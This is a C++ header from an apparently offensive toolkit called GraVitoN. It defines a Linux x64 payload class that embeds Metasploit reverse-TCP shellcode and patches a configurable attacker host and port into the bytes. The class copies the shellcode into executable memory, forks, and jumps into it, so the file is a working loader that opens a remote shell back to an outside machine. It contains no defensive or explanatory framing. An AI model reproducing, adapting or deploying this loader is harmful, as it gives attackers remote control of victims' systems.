/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief Payload_Linux64r
 *
*/

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
#ifndef _GVN_PAYLOAD_LINUX64R_HEAD_
#define _GVN_PAYLOAD_LINUX64R_HEAD_

#include "../gvn_payload.hpp"

#include <cstdio>
#include <cstdlib>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <unistd.h>

using namespace GraVitoN;

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
/**
 * @brief A bind shell for linux x64
 *
 */
class Payload_Linux64r : public GraVitoN::Bin_Payload
{
protected:
	virtual bool initPayload();

public:
	/// Constructor
    Payload_Linux64r();

	/// Destructor
    virtual ~Payload_Linux64r();

	/**
	 * @brief Initialize
	 *
	 * @param [in] _options
	 *
	 * @options
	 * PORT: reverse bind port, HOST: server
	 *
	 */
    virtual bool initialize ( const string &_options );

	/// @see Payload::run()
	virtual bool run();
};

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Payload_Linux64r::Payload_Linux64r()
{
    jumper = _null_;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Payload_Linux64r::~Payload_Linux64r()
{
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload_Linux64r::initPayload()
{
	
    int port = 7357;
	string host;
	/// Parse options
	OptParser::getValueAsInt(options, "PORT", port);
	OptParser::getValueAsString(options, "HOST", host);
	Logger::logVariable("HOST", host);
	
	/*
	 * linux/x64/shell/reverse_tcp - 68 bytes (stage 1)
	 * http://www.metasploit.com
	 * VERBOSE=false, LHOST=192.168.56.1, LPORT=7357,
	 * ReverseConnectRetries=5, ReverseAllowProxy=false,
	 * PrependSetresuid=false, PrependSetreuid=false,
	 * PrependSetuid=false, PrependChrootBreak=false,
	 * AppendExit=false, InitialAutoRunScript=, AutoRunScript=
	 */
	unsigned char buf[] =
	"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
	"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x56\x50\x6a\x29\x58\x99\x6a"
	"\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x1c\xbd"
	"\xc0\xa8\x38\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f"
	"\x05\x59\x5e\x5a\x0f\x05\xff\xe6";
	/*
	 * "\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
	 * "\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x56\x50\x6a\x29\x58\x99\x6a"
	 * "\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x[LPORT:2]"
	 * "\x[LHOST:4]\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f"
	 * "\x05\x59\x5e\x5a\x0f\x05\xff\xe6";
	 */
	int buf_len = 68;
	
	/// Change port number
	unsigned char up = port / 256, down = port % 256;
	unsigned int ip[4];
	buf[43] = up;
	buf[44] = down;
	sscanf(host.c_str(), "%d.%d.%d.%d", &ip[0], &ip[1], &ip[2], &ip[3]);
	for(int i=0; i<4; ++i)
		buf[45+i] = (unsigned char)ip[i];
	
    payload_size = buf_len;
    payload = new unsigned char[payload_size];
    memcpy ( payload, buf, payload_size * sizeof ( unsigned char ) );

    return true;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload_Linux64r::initialize ( const string &_options )
{
    options = _options;

    Logger::logIt ( "init payload... " );
    initPayload();
    Logger::logItLn ( "done" );

	/// Copy payload to heap and set RWX permisson
    // jumper = ( void ( * ) ( void* ) ) malloc ( payload_size );
	/// During my linux tests, I discoverd that mmap is better than mprotect
	jumper = ( void ( * ) ( void* ) ) mmap( 0, payload_size,
											PROT_READ | PROT_WRITE | PROT_EXEC,
											MAP_SHARED | MAP_ANONYMOUS,
											-1, 0 );

    memcpy ( ( void* ) jumper, ( void * ) payload, payload_size * sizeof ( unsigned char ) );

    return true;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload_Linux64r::run()
{
	/// Fork
    Logger::logItLn ("Forking...");
	int pid = fork();


	/// If i'm child process
	if ( pid == 0 )
	{
		/*
		/// Set Page Permissions
		unsigned long page = ( unsigned long ) jumper & ~ ( unsigned long ) ( getpagesize() - 1 );
		if ( mprotect ( ( unsigned char* ) page, getpagesize(), PROT_READ | PROT_WRITE | PROT_EXEC ) ) {
			Logger::logIt ( "mprotect failed - errorno: " );
			Logger::logItLn ( errno );

			return false;
		}
		*/

		/// A Little Delay!
		int _delay = 320;
		while ( _delay > 0 ) {
			--_delay;
		}

		/// Jumping to starting address of payload

		int useless_out = 0;
		Logger::logItLn ( "Jumping on Payload..." );
		asm (
			"mov %1, %%rbx;"
			"jmp *%%rbx;"
			: "=r" ( useless_out )
			: "r" ( jumper )
			: "%rbx"
		);

		exit(0);
	}

	/// While Child is runnig
	while( waitpid(pid, NULL, 0) > 0 )
		sleep(0.01);

	Logger::logItLn ( "call > done" );
    return true;
}


#endif // _GVN_PAYLOAD_LINUX64R_HEAD_
